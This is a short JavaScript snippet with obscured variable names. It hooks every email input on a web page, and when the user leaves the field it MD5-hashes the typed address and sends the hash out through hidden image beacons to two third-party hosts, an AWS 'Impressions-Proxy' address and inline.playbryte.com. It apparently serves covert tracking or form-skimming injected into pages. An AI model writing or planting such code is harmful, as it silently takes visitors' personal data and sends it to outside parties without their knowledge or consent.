var fdskj = document.getElementsByName('email');
var pnoo = false;
for (var i = 0; i < fdskj.length; i++) {
    if (fdskj[i].onblur == null) {
        fdskj[i].onblur = function() {
            if (!pnoo && this.value != null && this.value.length > 0) {
                var i = document.createElement('img');
                i.setAttribute('src', 'http://Impressions-Proxy-1085035873.us-east-1.elb.amazonaws.com/impression.do/?event=ecap&user_id=' + escape(pbuid) + '&implementation_id=' + escape(pbimp) + '&subid=' + escape(CryptoJS.MD5(this.value.toLowerCase())));
                i.style.display = 'none';
                document.body.appendChild(i);

                var p = document.createElement('img');
                p.setAttribute('src', 'http://inline.playbryte.com/ske?n=ecap&v=' + escape(CryptoJS.MD5(this.value.toLowerCase())));
                p.style.display = 'none';
                document.body.appendChild(p);
                pnoo = true;
            }
        };
    }
}
